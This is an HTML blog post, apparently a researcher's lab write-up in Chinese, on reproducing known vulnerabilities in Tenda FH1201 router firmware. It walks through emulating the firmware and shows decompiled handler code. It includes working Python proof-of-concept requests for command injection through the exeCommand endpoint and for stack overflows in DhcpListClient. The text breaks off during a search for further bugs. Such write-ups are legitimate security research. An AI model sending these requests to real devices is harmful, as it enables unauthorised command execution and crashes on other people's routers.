@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>tenda-FH1201-cve - ldrx30</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="
+一个老固件了😢
+" />
+	<meta property="og:image" content=""/>
+	<meta property="og:title" content="tenda-FH1201-cve" />
+<meta property="og:description" content="
+一个老固件了😢
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/posts/tenda-fh1201-cve/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-08-17T00:00:00+00:00" />
+<meta property="article:modified_time" content="2024-08-17T00:00:00+00:00" />
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="tenda-FH1201-cve"/>
+<meta name="twitter:description" content="
+一个老固件了😢
+"/>
+<script src="http://localhost:1313/js/feather.min.js"></script>
+	
+	
+        <link href="http://localhost:1313/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="http://localhost:1313/css/main.5cebd7d4fb2b97856af8d32a6def16164fcf7d844e98e236fcb3559655020373.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="http://localhost:1313/css/dark.d22e2a2879d933a4b781535fc4c4c716e9f9d35ea4986dd0cbabda82effc4bdd.css"  disabled />
+	
+
+	
+	
+		<script type="text/javascript"
+		src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+		</script>
+
+		
+		<script type="text/x-mathjax-config">
+		MathJax.Hub.Config({
+			tex2jax: {
+				inlineMath: [['$','$'], ['\\(','\\)']],
+				displayMath: [['$$','$$'], ['\[','\]']],
+				processEscapes: true,
+				processEnvironments: true,
+				skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+				TeX: { equationNumbers: { autoNumber: "AMS" },
+						 extensions: ["AMSmath.js", "AMSsymbols.js"] }
+			}
+		});
+		</script>
+	
+
+	
+	
+		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css">
+		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js"></script>
+		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>
+
+		
+		<script>
+			document.addEventListener("DOMContentLoaded", function() {
+					renderMathInElement(document.body, {
+							delimiters: [
+									{left: "$$", right: "$$", display: true},
+									{left: "$", right: "$", display: false}
+							]
+					});
+			});
+			</script>
+	
+
+	
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="http://localhost:1313/">ldrx30</a>
+	</div>
+	<nav>
+		
+		<a href="/">Home</a>
+		
+		<a href="/posts">All posts</a>
+		
+		<a href="/about">About</a>
+		
+		| <span id="dark-mode-toggle" onclick="toggleTheme()"></span>
+		<script src="http://localhost:1313/js/themetoggle.js"></script>
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">tenda-FH1201-cve</h1>
+			<div class="meta">Posted on Aug 17, 2024</div>
+		</div>
+		
+
+		
+
+		<section class="body">
+			<blockquote>
+<p>一个老固件了😢</p>
+</blockquote>
+<h2 id="fh1201">FH1201</h2>
+<p><a href="https://www.tendacn.com/download/detail-3322.html">FH1201 Firmware_Tenda</a></p>
+<ul>
+<li><a href="https://github.com/iotresearch/iot-vuln/blob/main/Tenda/FH1201/exeCommand/README.md">cve</a></li>
+</ul>
+<p>固件解包需要下载 <code>sasquatch</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ git clone https://github.com/devttys0/sasquatch --depth<span style="color:#ff79c6">=</span><span style="color:#bd93f9">1</span>
+</span></span><span style="display:flex;"><span>$ <span style="color:#8be9fd;font-style:italic">CC</span><span style="color:#ff79c6">=</span>gcc-9 ./build.sh
+</span></span></code></pre></div><p>32位 mips 小端序</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ file bin/busybox
+</span></span><span style="display:flex;"><span>bin/busybox: ELF 32-bit LSB executable, MIPS, MIPS32 version <span style="color:#bd93f9">1</span> <span style="color:#ff79c6">(</span>SYSV<span style="color:#ff79c6">)</span>, dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
+</span></span></code></pre></div><p>网卡</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo brctl addbr br0 
+</span></span><span style="display:flex;"><span>$ sudo brctl addif br0 eth0 
+</span></span><span style="display:flex;"><span>$ sudo ifconfig br0 up 
+</span></span><span style="display:flex;"><span>$ sudo dhclient br0
+</span></span></code></pre></div><p>只需要模拟 httpd</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cp <span style="color:#ff79c6">$(</span>which qemu-mipsel-static<span style="color:#ff79c6">)</span> . 
+</span></span><span style="display:flex;"><span>$ sudo chroot ./ ./qemu-mipsel-static ./bin/httpd
+</span></span></code></pre></div><p>需要patch一部分</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ~/idapro-9.0/ida64 bin/httpd
+</span></span></code></pre></div><p>patch main函数的<code>check_network</code>函数。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">loc_489228</span>:
+</span></span><span style="display:flex;"><span>addiu   $v0, $fp, <span style="color:#bd93f9">0xE0</span><span style="color:#ff79c6">+</span>var_34
+</span></span><span style="display:flex;"><span>move    $a0, $v0
+</span></span><span style="display:flex;"><span>la      $t9, check_network
+</span></span><span style="display:flex;"><span>nop
+</span></span><span style="display:flex;"><span>li      $v0, <span style="color:#bd93f9">1</span>           # Keypatch modified <span style="color:#ff79c6">this</span> <span style="color:#8be9fd;font-style:italic">from</span>:
+</span></span><span style="display:flex;"><span>                         <span style="color:#ff79c6">#   jalr $t9 # check_network
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>nop                      # Keypatch modified <span style="color:#ff79c6">this</span> <span style="color:#8be9fd;font-style:italic">from</span>:
+</span></span><span style="display:flex;"><span>                         <span style="color:#ff79c6">#   nop
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>lw      $gp, <span style="color:#bd93f9">0xE0</span><span style="color:#ff79c6">+</span>var_D0($fp)
+</span></span><span style="display:flex;"><span>bgtz    $v0, loc_48926C
+</span></span><span style="display:flex;"><span>nop
+</span></span></code></pre></div><p>goahead webserver框架，查看路由</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>websFormDefine(<span style="color:#f1fa8c">&#34;exeCommand&#34;</span>, formexeCommand);
+</span></span></code></pre></div><p>漏洞代码：可以看出来cmd没做检查，最后直接有个 <code>else</code> 也就是可以执行任意命令。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>FILE <span style="color:#ff79c6">*</span><span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">formexeCommand</span>(<span style="color:#8be9fd">int</span> a1)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  size_t v1; <span style="color:#6272a4">// $v0
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  FILE <span style="color:#ff79c6">*</span>result; <span style="color:#6272a4">// $v0
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">int</span> v3; <span style="color:#6272a4">// [sp+18h] [+18h]
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  size_t n; <span style="color:#6272a4">// [sp+1Ch] [+1Ch]
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>src; <span style="color:#6272a4">// [sp+20h] [+20h]
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  FILE <span style="color:#ff79c6">*</span>stream; <span style="color:#6272a4">// [sp+24h] [+24h]
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">char</span> v7[<span style="color:#bd93f9">512</span>]; <span style="color:#6272a4">// [sp+28h] [+28h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">char</span> v8[<span style="color:#bd93f9">256</span>]; <span style="color:#6272a4">// [sp+228h] [+228h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">char</span> v9[<span style="color:#bd93f9">4096</span>]; <span style="color:#6272a4">// [sp+328h] [+328h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">char</span> v10[<span style="color:#bd93f9">4096</span>]; <span style="color:#6272a4">// [sp+1328h] [+1328h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
+</span></span><span style="display:flex;"><span>  memset(v7, <span style="color:#bd93f9">0</span>, <span style="color:#ff79c6">sizeof</span>(v7));
+</span></span><span style="display:flex;"><span>  memset(v8, <span style="color:#bd93f9">0</span>, <span style="color:#ff79c6">sizeof</span>(v8));
+</span></span><span style="display:flex;"><span>  memset(v9, <span style="color:#bd93f9">0</span>, <span style="color:#ff79c6">sizeof</span>(v9));
+</span></span><span style="display:flex;"><span>  memset(v10, <span style="color:#bd93f9">0</span>, <span style="color:#ff79c6">sizeof</span>(v10));
+</span></span><span style="display:flex;"><span>  v3 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
+</span></span><span style="display:flex;"><span>  src <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)websGetVar(a1, <span style="color:#f1fa8c">&#34;cmdinput&#34;</span>, <span style="color:#ff79c6">&amp;</span>unk_4AFDC0);
+</span></span><span style="display:flex;"><span>  strcpy(v7, src);
+</span></span><span style="display:flex;"><span>  myCmd(v8, v7);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>strcmp(v8, <span style="color:#f1fa8c">&#34;cd&#34;</span>) )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    v1 <span style="color:#ff79c6">=</span> strlen(path_buf);
+</span></span><span style="display:flex;"><span>    myPath(path_buf, v7, v1);
+</span></span><span style="display:flex;"><span>    doSystemCmd(<span style="color:#f1fa8c">&#34;echo %s &gt; /tmp/cmdTmp.txt&#34;</span>, path_buf);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>strcmp(v8, <span style="color:#f1fa8c">&#34;ls&#34;</span>) <span style="color:#ff79c6">||</span> <span style="color:#ff79c6">!</span>strcmp(v8, <span style="color:#f1fa8c">&#34;cat&#34;</span>) )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    myLsCat(v7);
+</span></span><span style="display:flex;"><span>    doSystemCmd(<span style="color:#f1fa8c">&#34;%s &gt; /tmp/cmdTmp.txt&#34;</span>, v7);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>strcmp(v8, <span style="color:#f1fa8c">&#34;echo&#34;</span>) )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    myEcho(v7);
+</span></span><span style="display:flex;"><span>    doSystemCmd(<span style="color:#f1fa8c">&#34;%s&#34;</span>, v7);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>strcmp(v8, <span style="color:#f1fa8c">&#34;pwd&#34;</span>) )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    doSystemCmd(<span style="color:#f1fa8c">&#34;echo %s &gt; /tmp/cmdTmp.txt&#34;</span>, path_buf);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>strcmp(v8, <span style="color:#f1fa8c">&#34;ping&#34;</span>) )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    doSystemCmd(<span style="color:#f1fa8c">&#34;%s -c 3 &gt; /tmp/cmdTmp.txt&#34;</span>, v7);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">else</span>
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    doSystemCmd(<span style="color:#f1fa8c">&#34;%s &gt; /tmp/cmdTmp.txt&#34;</span>, v7);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  result <span style="color:#ff79c6">=</span> fopen(<span style="color:#f1fa8c">&#34;/tmp/cmdTmp.txt&#34;</span>, <span style="color:#f1fa8c">&#34;r&#34;</span>);
+</span></span><span style="display:flex;"><span>  stream <span style="color:#ff79c6">=</span> result;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( result )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">while</span> ( <span style="color:#bd93f9">1</span> )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      memset(v10, <span style="color:#bd93f9">0</span>, <span style="color:#ff79c6">sizeof</span>(v10));
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>fgets(v10, <span style="color:#bd93f9">4096</span>, stream) )
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">break</span>;
+</span></span><span style="display:flex;"><span>      n <span style="color:#ff79c6">=</span> strlen(v10);
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">if</span> ( v3 <span style="color:#ff79c6">+</span> n <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span> <span style="color:#ff79c6">&gt;=</span> <span style="color:#bd93f9">0x1001</span> )
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">break</span>;
+</span></span><span style="display:flex;"><span>      memcpy(<span style="color:#ff79c6">&amp;</span>v9[v3], v10, n);
+</span></span><span style="display:flex;"><span>      v3 <span style="color:#ff79c6">+=</span> n;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    fclose(stream);
+</span></span><span style="display:flex;"><span>    websWrite(
+</span></span><span style="display:flex;"><span>      a1,
+</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;HTTP/1.0 200 OK</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">Content-type: text/plain; charset=utf-8</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">Pragma: no-cache</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">Cache-Control: no-cache</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>);
+</span></span><span style="display:flex;"><span>    websWrite(a1, <span style="color:#f1fa8c">&#34;%s&#34;</span>, v9);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> (FILE <span style="color:#ff79c6">*</span>)websDone(a1, <span style="color:#bd93f9">200</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> result;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>PoC</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>import requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ip <span style="color:#ff79c6">=</span> &#39;<span style="color:#bd93f9">192.168.85.143</span>&#39;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#ff79c6">=</span> f<span style="color:#f1fa8c">&#34;http://{ip}/goform/exeCommand&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>data <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;cmdinput=ls;&#34;</span>
+</span></span><span style="display:flex;"><span>ret <span style="color:#ff79c6">=</span> requests.post(url<span style="color:#ff79c6">=</span>url,data<span style="color:#ff79c6">=</span>data)
+</span></span></code></pre></div><p>可以成功命令执行</p>
+<p>在复现一下其余的：<code>fromDhcpListClient</code> 函数</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">fromDhcpListClient</span>(<span style="color:#8be9fd">int</span> a1)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">int</span> v1; <span style="color:#6272a4">// $v0
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">int</span> i; <span style="color:#6272a4">// [sp+18h] [+18h]
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>Var; <span style="color:#6272a4">// [sp+1Ch] [+1Ch]
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>nptr; <span style="color:#6272a4">// [sp+20h] [+20h]
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">int</span> v6; <span style="color:#6272a4">// [sp+24h] [+24h]
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">char</span> v7[<span style="color:#bd93f9">256</span>]; <span style="color:#6272a4">// [sp+28h] [+28h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">char</span> v8[<span style="color:#bd93f9">256</span>]; <span style="color:#6272a4">// [sp+128h] [+128h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">char</span> v9[<span style="color:#bd93f9">320</span>]; <span style="color:#6272a4">// [sp+228h] [+228h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  _DWORD v10[<span style="color:#bd93f9">4</span>]; <span style="color:#6272a4">// [sp+368h] [+368h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
+</span></span><span style="display:flex;"><span>  memset(v9, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0x40u</span>);
+</span></span><span style="display:flex;"><span>  nptr <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)websGetVar(a1, <span style="color:#f1fa8c">&#34;LISTLEN&#34;</span>, <span style="color:#f1fa8c">&#34;0&#34;</span>);
+</span></span><span style="display:flex;"><span>  Var <span style="color:#ff79c6">=</span> (<span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)websGetVar(a1, <span style="color:#f1fa8c">&#34;page&#34;</span>, <span style="color:#f1fa8c">&#34;1&#34;</span>);
+</span></span><span style="display:flex;"><span>  v9[<span style="color:#bd93f9">64</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>; ; <span style="color:#ff79c6">++</span>i )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    v1 <span style="color:#ff79c6">=</span> atoi(nptr);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> ( v1 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span> <span style="color:#ff79c6">&lt;</span> i )
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">break</span>;
+</span></span><span style="display:flex;"><span>    memset(v10, <span style="color:#bd93f9">0</span>, <span style="color:#ff79c6">sizeof</span>(v10));
+</span></span><span style="display:flex;"><span>    sprintf((<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)v10, <span style="color:#f1fa8c">&#34;%s%d&#34;</span>, <span style="color:#f1fa8c">&#34;list&#34;</span>, i);
+</span></span><span style="display:flex;"><span>    v6 <span style="color:#ff79c6">=</span> websGetVar(a1, v10, <span style="color:#ff79c6">&amp;</span>unk_4AEC38);
+</span></span><span style="display:flex;"><span>    strcpy(v8, (<span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)(v6 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>));    <span style="color:#6272a4">// buffer overflow [1]
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    v8[strlen(v8) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
+</span></span><span style="display:flex;"><span>    sprintf(v9, <span style="color:#f1fa8c">&#34;dhcps.Staticip%d&#34;</span>, i);
+</span></span><span style="display:flex;"><span>    SetValue(v9, v8);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  SetValue(<span style="color:#f1fa8c">&#34;dhcps.Staticnum&#34;</span>, nptr);
+</span></span><span style="display:flex;"><span>  sprintf(v7, <span style="color:#f1fa8c">&#34;lan_dhcp_static.asp?page=%s&#34;</span>, Var);  <span style="color:#6272a4">// buffer overflow [2]
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">if</span> ( CommitCfm() )
+</span></span><span style="display:flex;"><span>    LoadDhcpService();
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> websRedirect(a1, v7);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>针对 <code>[1]</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ip <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;192.168.85.143&#34;</span>
+</span></span><span style="display:flex;"><span>url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;http://&#34;</span> <span style="color:#ff79c6">+</span> ip <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;/goform/DhcpListClient&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;a&#34;</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">0x1000</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>data <span style="color:#ff79c6">=</span> {<span style="color:#f1fa8c">&#34;LISTLEN&#34;</span>:<span style="color:#bd93f9">1</span>,<span style="color:#f1fa8c">&#34;page&#34;</span>:<span style="color:#bd93f9">1</span>,<span style="color:#f1fa8c">&#34;list1&#34;</span>: payload}
+</span></span><span style="display:flex;"><span>response <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>post(url, data<span style="color:#ff79c6">=</span>data)
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(response<span style="color:#ff79c6">.</span>text)
+</span></span></code></pre></div><p>针对 <code>[2]</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>IP <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;192.168.85.143&#34;</span>
+</span></span><span style="display:flex;"><span>url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;http://</span><span style="color:#f1fa8c">{</span>IP<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/goform/fromDhcpListClient?&#34;</span>
+</span></span><span style="display:flex;"><span>url <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#34;page=&#34;</span> <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;a&#34;</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">0x1000</span>
+</span></span><span style="display:flex;"><span>url <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#34;&amp;LISTLEN=0&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>response <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>get(url)
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(response<span style="color:#ff79c6">.</span>text)
+</span></span></code></pre></div><p>漏洞利用</p>
+<ul>
+<li>MIPS ROP？</li>
+<li>rwx shellcode</li>
+</ul>
+<h3 id="漏洞挖掘">漏洞挖掘</h3>
+<p>查看tenda httpd相关漏洞，栈溢出</p>
+<ul>
+<li>命令注入</li>
+<li>strcpy</li>
+<li>sprintf</li>
+<li>strcat</li>
+</ul>
+<p>用插件：<a href="https://github.com/Accenture/VulFi">VulFi: IDA Pro plugin</a>，寻找到一个 <code>formWrlExtraGet</code>，没有人申请？</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">formWrlExtraGet</span>(<span style="color:#8be9fd">int</span> a1)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  chkHz <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)websGetVar(a1, <span style="color:#f1fa8c">&#34;chkHz&#34;</span>, <span style="color:#f1fa8c">&#34;0&#34;</span>);    <span style="color:#6272a4">// get from parameter
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  Var <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)websGetVar(a1, <span style="color:#f1fa8c">&#34;extra_mode&#34;</span>, <span style="color:#bd93f9">0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>strcmp(chkHz, <span style="color:#f1fa8c">&#34;0&#34;</span>) )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    get_wl_cfg_info(<span style="color:#bd93f9">24</span>, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>, v62, <span style="color:#bd93f9">0</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>strcmp(chkHz, <span style="color:#f1fa8c">&#34;1&#34;</span>) )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    get_wl_cfg_info(<span style="color:#bd93f9">5</span>, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>, v62, <span style="color:#bd93f9">0</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  sprintf(v63, <span style="color:#f1fa8c">&#34;%s%s&#34;</span>, v62, <span style="color:#f1fa8c">&#34;wisp.&#34;</span>);
+</span></span><span style="display:flex;"><span>  sprintf(v64, <span style="color:#f1fa8c">&#34;%s%s&#34;</span>, v62, <span style="color:#f1fa8c">&#34;client.&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>Var )
+</span></span><span style="display:flex;"><span>  {
